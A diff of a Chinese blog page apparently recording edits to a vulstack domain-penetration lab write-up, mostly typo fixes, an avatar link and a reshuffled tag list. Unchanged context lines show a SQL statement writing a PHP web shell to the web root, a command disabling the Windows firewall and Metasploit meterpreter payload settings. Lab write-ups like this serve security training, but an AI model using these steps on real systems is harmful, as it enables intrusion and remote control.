@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/01/15/d64i21QxVnCycwU.png">
 <meta property="og:image" content="https://i.loli.net/2020/01/15/hGPeV8lky4aY562.png">
 <meta property="og:image" content="https://i.loli.net/2020/01/15/jOh1iD7QA6Lan3o.png">
-<meta property="og:updated_time" content="2020-01-15T09:06:55.035Z">
+<meta property="og:updated_time" content="2020-01-19T05:17:48.324Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="vulstack域渗透靶场-wp">
 <meta name="twitter:description" content="有1说1 ，这次安恒的寒假班真的学到很多！！！这里分享一下我域渗透靶场实战的wp">
@@ -67,7 +67,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="https://ws3.sinaimg.cn/large/006Xmmmggy1g5wpex4u6uj305j05j3ym.jpg" class="js-avatar">
+			<img src="https://sm.ms/image/eX3vorU89l4x5H6" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">glotozz</a></h1>
@@ -127,7 +127,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="https://ws3.sinaimg.cn/large/006Xmmmggy1g5wpex4u6uj305j05j3ym.jpg" class="js-avatar">
+				<img src="https://sm.ms/image/eX3vorU89l4x5H6" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">glotozz</h1>
@@ -207,7 +207,7 @@
 <p>尝试sql语句写入shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php system($_GET[‘cmd’]); ?&gt;&quot; into outfile &quot;后门文件的绝对路径&quot;</span><br></pre></td></tr></table></figure>
 
-<p>通过phpstudy查看网站的绝对路径</p>
+<p>通过phpinfo查看网站的绝对路径</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\www\a.php</span><br><span class="line">SELECT &quot;&lt;?php system($_GET[‘cmd’]); ?&gt;&quot; into outfile &quot;C:\phpStudy\www\a.php&quot;</span><br></pre></td></tr></table></figure>
 
 <p>提示 *<em>The MySQL server is running with the –secure-file-priv option so it cannot execute this statement *</em></p>
@@ -240,7 +240,7 @@
 <h4 id="接下来利用工具探测域内存活主机"><a href="#接下来利用工具探测域内存活主机" class="headerlink" title="接下来利用工具探测域内存活主机"></a>接下来利用工具探测域内存活主机</h4><p><strong>nbtscan和icmp探活</strong></p>
 <p><img src="https://i.loli.net/2020/01/14/wCuApzLW1mBE95v.png" alt="Snipaste_2020-01-14_14-15-33.png"></p>
 <p>不知道为啥没结果，原来是用错了网卡</p>
-<p>我猜测可能是防护墙的原因</p>
+<p>我猜测可能是防火墙的原因</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>
 
 <p>关了发现还是没有。。。</p>
@@ -278,7 +278,7 @@
 <p>但是whoami、ipconfig等命令确实可以执行。。每次都需要set command</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles</span><br></pre></td></tr></table></figure>
 
-<p>但是查看防火墙状态确实是关闭了。。。</p>
+<p>查看防火墙状态确实是关闭了。。。</p>
 <p>那么可以正向连接，使用之前成功getshell的第3个模块，却还是不行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#反向连接</span><br><span class="line">set payload  windows/x64/meterpreter/reverse_tcp</span><br><span class="line">#正向连接</span><br><span class="line">set payload  windows/x64/meterpreter/bind_tcp</span><br></pre></td></tr></table></figure>
 
@@ -607,14 +607,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">CRLF</a>
               </li>
              
@@ -623,11 +615,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">thinkcmf</a>
+                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">duomicms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -635,11 +631,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
+                <a href="javascript:void(0)" class="js-tag color4">thinkcmf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
+                <a href="javascript:void(0)" class="js-tag color4">tp5</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -648,6 +644,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">typecho</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -691,7 +691,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -699,15 +699,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
               </li>
              
               <li class="article-tag-list-item">
